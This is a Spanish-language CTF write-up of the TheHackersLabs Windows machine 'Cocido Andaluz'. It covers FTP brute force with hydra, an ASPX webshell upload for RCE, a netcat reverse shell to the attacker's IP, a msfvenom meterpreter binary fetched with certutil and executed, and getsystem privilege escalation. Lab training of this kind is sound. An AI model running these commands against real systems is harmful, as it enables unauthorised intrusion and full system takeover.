---
title: "Cocido Andaluz TheHackersLabs"
date: 2026-10-07 18:36:22 +0200
categories: [CTF, TheHackersLabs]
tags: [ejptv2, easy, fileUpload, bruteForce, RCE]
image:
  path: /assets/img/posts/2026-10-07-cocido-andaluz/00-cocido_andaluz.png
  alt: Banner
---

- - - -

## Introducción

En este writeup se documenta la resolución paso a paso de una máquina Windows, abordando distintas técnicas de seguridad ofensiva especialmente relevantes para la preparación de la certificación **eJPTv2**. El proceso incluye el reconocimiento y enumeración de servicios, ataque de credenciales sobre FTP, explotación de vulnerabilidades de subida de archivos para obtener **RCE** mediante una webshell ASP.NET, y diversas técnicas de post-explotación. Finalmente, se aborda la escalada de privilegios en Windows mediante el abuso de **SeImpersonatePrivilege**, completando así la cadena de compromiso del sistema.

## Fase de Reconocimiento

- - -

### Identificación de objetivo en la red

```bash
arp-scan -I enp0s3 --localnet --ignoredups
```

![Identificación de objetivo en la red](/assets/img/posts/2026-10-07-cocido-andaluz/01-indentificacion-de-objetivo-en-la.png){: width="600" }

Por el OUI de la MAC podemos intuir que esa es la IP de nuestra máquina víctima. Para salir de dudas podemos lanzarle un ping a ver si contesta y podemos validar su TTL.

```bash
ping -c 2 192.168.0.79
```

![Identificación de objetivo en la red](/assets/img/posts/2026-10-07-cocido-andaluz/02-indentificacion-de-objetivo-en-la.png){: width="500" }

Responde a las trazas *icmp* y vemos que su TTL es de 128, por lo que podemos suponer que se trata de una máquina Windows (TTL → 128 Windows - 64 Linux generalmente).

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.79 -oN allPorts
```

```bash
grep '^[0-9]' allPorts | cut -d '/' -f1 | xargs | sort | tr ' ' ',' 
```

![Escaneo de puertos](/assets/img/posts/2026-10-07-cocido-andaluz/03-escaneo-de-puertos.png)

```bash
nmap -p21,80,135,139,445,49152,49153,49154,49155,49156,49157,49158 -sCV -oN targeted 192.168.0.79 
```

![Escaneo de puertos](/assets/img/posts/2026-10-07-cocido-andaluz/04-escaneo-de-puertos.png){: width="900" }

Tras el escaneo vemos varios servicios expuestos, entre ellos un servicio *FTP*, *SMB* y *HTTP*, para enumerar y tratar de trazar un vector de ataque a la máquina objetivo.

## Enumeración

- - -

### Enumeración de servicio FTP

Para enumerar este servicio podemos validar si el login con el usuario anonymous está habilitado, para ello podemos utilizar un script de nmap específico, aunque si en el escaneo anterior no reportó nada no creo que sea el caso.

```bash
nmap -p21 --script ftp-anon 192.168.0.79
```

![Enumeración de servicio FTP](/assets/img/posts/2026-10-07-cocido-andaluz/05-enumeracion-de-servicio-ftp.png){: width="600" }

No reporta nada, para salir de dudas podemos validarlo tratando de utilizar este método para acceder al servicio:

![Enumeración de servicio FTP](/assets/img/posts/2026-10-07-cocido-andaluz/06-enumeracion-de-servicio-ftp.png){: width="400" }

Efectivamente está deshabilitado. De momento vamos a dejar este servicio hasta que encontremos algo más de información, una credencial o algún usuario para aplicar fuerza bruta.

### Enumeración de servicio SMB

Para enumerar este servicio podemos hacer uso de las Null sessions para tratar de enumerar recursos compartidos a nivel de red y los permisos que tenemos sobre ellos.

```bash
nxc smb 192.168.0.79 -u '' -p '' --shares 
```

![Enumeración de servicio SMB](/assets/img/posts/2026-10-07-cocido-andaluz/07-enumeracion-de-servicio-smb.png)

Tampoco encontramos nada de lo que tirar de momento, en este punto vamos a pasar al servicio HTTP a ver si tenemos más suerte.

### Enumeración de servicio HTTP

```bash
whatweb http://192.168.0.79
```

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-07-cocido-andaluz/08-enumeracion-de-servicio-http.png)

```bash
nmap -p80 --script http-enum 192.168.0.79 -oN webScan
```

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-07-cocido-andaluz/09-enumeracion-de-servicio-http.png){: width="700" }

No encontramos nada destacable de momento, vamos a acceder a través del navegador a ver el aspecto del servicio web.

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-07-cocido-andaluz/10-enumeracion-de-servicio-http.png){: width="1000" }

Una instalación por defecto de Apache2 en una máquina Windows. En este punto toca aplicar fuzzing para el descubrimiento de rutas y archivos expuestos en la web.

```bash
feroxbuster -u http://192.168.0.79 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html,.txt
```

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-07-cocido-andaluz/11-enumeracion-de-servicio-http.png){: width="800" }

- /aspnet_client

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-07-cocido-andaluz/12-enumeracion-de-servicio-http.png){: width="600" }

- /aspnet_client/system_web

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-07-cocido-andaluz/13-enumeracion-de-servicio-http.png){: width="600" }

Descubrimos varios directorios mediante fuzzing, pero no tenemos acceso a los mismos. En este punto, como no encontramos nada donde tirar tras la enumeración de servicios, nos queda aplicar un ataque de fuerza bruta al servicio *FTP*.

## Explotación

- - -

### Ataque de fuerza bruta a servicio FTP

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt ftp://192.168.0.79
```

![Ataque de fuerza bruta a servicio FTP](/assets/img/posts/2026-10-07-cocido-andaluz/14-ataque-de-fuerza-bruta-a.png)

Bien, encontramos credenciales válidas, por lo que podemos acceder al servicio FTP y enumerar los recursos compartidos en el mismo.

![Ataque de fuerza bruta a servicio FTP](/assets/img/posts/2026-10-07-cocido-andaluz/15-ataque-de-fuerza-bruta-a.png){: width="500" }

Parece que el recurso compartido corresponde a la raíz del sitio web de la máquina víctima. En este punto podríamos hacer una prueba subiendo una web shell para ver si logramos un RCE (al tratarse de un IIS, recordemos que debemos subir un archivo .aspx).

### Obteniendo una webShell en IIS

Para esto podemos utilizar un archivo que viene por defecto en distribuciones Kali Linux llamado “cmdasp.aspx”. En mi caso estoy utilizando Parrot, por lo que voy a descargarlo de la siguiente manera:

```bash
 wget https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/asp/cmdasp.aspx
```

Una vez descargado, lo subimos al servicio FTP.

![Obteniendo una webShell en IIS](/assets/img/posts/2026-10-07-cocido-andaluz/16-obteniendo-una-webshell-en-iis.png)

Accedemos vía navegador:

![Obteniendo una webShell en IIS](/assets/img/posts/2026-10-07-cocido-andaluz/17-obteniendo-una-webshell-en-iis.png){: width="600" }

De esta manera logramos un RCE en la máquina víctima a través de una web shell en un IIS. En este punto vamos a enumerar un poco de información local de la máquina.

![Obteniendo una webShell en IIS](/assets/img/posts/2026-10-07-cocido-andaluz/18-obteniendo-una-webshell-en-iis.png){: width="600" }

![Obteniendo una webShell en IIS](/assets/img/posts/2026-10-07-cocido-andaluz/19-obteniendo-una-webshell-en-iis.png){: width="600" }

![Obteniendo una webShell en IIS](/assets/img/posts/2026-10-07-cocido-andaluz/20-obteniendo-una-webshell-en-iis.png){: width="600" }

De esta forma encontramos la primera flag de usuario en el directorio C:\users\info. Ahora quedaría ganar acceso a la máquina para escalar privilegios y conseguir la última flag. Para ganar acceso a la máquina víctima podemos proceder de la siguiente manera: compartiremos el binario de netcat al equipo objetivo para lanzarnos una reverse shell a nuestra máquina atacante.

```bash
ll /usr/share/windows-resources/binaries
```

![Obteniendo una webShell en IIS](/assets/img/posts/2026-10-07-cocido-andaluz/21-obteniendo-una-webshell-en-iis.png){: width="500" }

En Parrot existe la ruta */usr/share/windows-resources/binaries*, donde podemos encontrar varios binarios útiles una vez ganamos ejecución de comandos en una máquina víctima con este sistema operativo; en este caso estaremos utilizando netcat. Para ello levantaremos un servicio SMB desde nuestra máquina atacante para compartir el binario y poder ejecutarlo desde la víctima, a su vez nos pondremos en escucha y nos lanzaremos la reverse shell:

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
impacket-smbserver smbFolder $(pwd) -smb2support 
```

Una vez hecho, desde la webShell lanzamos la reverse shell:

```http
\\192.168.0.78\smbFolder\nc.exe -e cmd.exe 192.168.0.78 443
```

![Obteniendo una webShell en IIS](/assets/img/posts/2026-10-07-cocido-andaluz/22-obteniendo-una-webshell-en-iis.png){: width="500" }

Una vez ganado acceso a la máquina podemos empezar con la escalada de privilegios.

## Escalada de privilegios

- - -

### Consiguiendo shell de tipo meterpreter

Lo primero es conseguir una shell de tipo meterpreter, y para ello vamos a generar un binario con msfvenom que nos lance una shell de tipo meterpreter a nuestro equipo atacante. Lo obtendremos en la máquina víctima con la herramienta *certutil* y lo ejecutaremos desde la reverse shell en una ruta en la que tengamos permisos, como _C:\Windows\Temp_.

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.78 lport=4444 -f exe -o meterpreterV3.exe
```

![Consiguiendo shell de tipo meterpreter](/assets/img/posts/2026-10-07-cocido-andaluz/23-consiguiendo-shell-de-tipo-meterpreter.png){: width="700" }

![Consiguiendo shell de tipo meterpreter](/assets/img/posts/2026-10-07-cocido-andaluz/24-consiguiendo-shell-de-tipo-meterpreter.png)

Una vez hecho, nos dirigimos a la ruta *C:\Windows\Temp*, en la cual obtendremos el binario malicioso recién generado:

```bash
# antes levantamos un servidor http con python en la ruta donde generamos el binario
python3 -m http.server
```

```bat
:: desde la máquina víctima  
certutil -urlcache -f http://192.168.0.78/meterpreterV3.exe meterpreterV3.exe
```

![Consiguiendo shell de tipo meterpreter](/assets/img/posts/2026-10-07-cocido-andaluz/25-consiguiendo-shell-de-tipo-meterpreter.png){: width="700" }

En este punto, antes de ejecutar el binario malicioso vamos a configurar el handler de Metasploit:

```bash
msfconsole
```

![Consiguiendo shell de tipo meterpreter](/assets/img/posts/2026-10-07-cocido-andaluz/26-consiguiendo-shell-de-tipo-meterpreter.png){: width="600" }

```bash
exploit
```

Y desde la reverse shell ejecutamos el binario malicioso.

```bat
meterpreterV3.exe
```

![Consiguiendo shell de tipo meterpreter](/assets/img/posts/2026-10-07-cocido-andaluz/27-consiguiendo-shell-de-tipo-meterpreter.png){: width="700" }

De esta manera habríamos obtenido una sesión de tipo meterpreter en la máquina víctima.

![Consiguiendo shell de tipo meterpreter](/assets/img/posts/2026-10-07-cocido-andaluz/28-consiguiendo-shell-de-tipo-meterpreter.png){: width="700" }

### Escalando privilegios con **getsystem**

Una vez obtenida la shell de tipo meterpreter de Metasploit, lo más común en máquinas Windows es utilizar el comando **getsystem**. Este comando automatiza varias técnicas comunes de escalada de privilegios (como el abuso de Named Pipes o la suplantación de tokens a través de diferentes métodos o técnicas) para pasar de un usuario estándar a administrador.

```bash
getsystem
```

![Escalando privilegios con **getsystem**](/assets/img/posts/2026-10-07-cocido-andaluz/29-escalando-privilegios-con-getsystem.png){: width="600" }

Lo que ocurre por detrás es que el comando **getsystem** de Meterpreter eleva privilegios en Windows hasta *NT AUTHORITY\SYSTEM* automatizando técnicas como **EfsPotato** (*Named Pipe Impersonation*). Para que funcione, requiere que el proceso comprometido posea el permiso *SeImpersonatePrivilege*, el cual permite suplantar tokens de seguridad. El ataque crea un canal local (*Named Pipe*) y coacciona a un servicio legítimo de Windows que corre como SYSTEM a conectarse a él. Al producirse la conexión, el exploit intercepta el canal, roba el token de seguridad del sistema mediante *ImpersonateNamedPipeClient* y genera una sesión con privilegios máximos.

En este punto podemos hallar la última flag de la máquina en *C:\Users\Administrador\Desktop*:

![Escalando privilegios con **getsystem**](/assets/img/posts/2026-10-07-cocido-andaluz/30-escalando-privilegios-con-getsystem.png){: width="500" }

Con esto habríamos completado la máquina Cocido Andaluz de TheHackersLab!!

![Complete](/assets/img/posts/2026-10-07-cocido-andaluz/99-certificado-rg4rrido-cocido-andaluz.png)
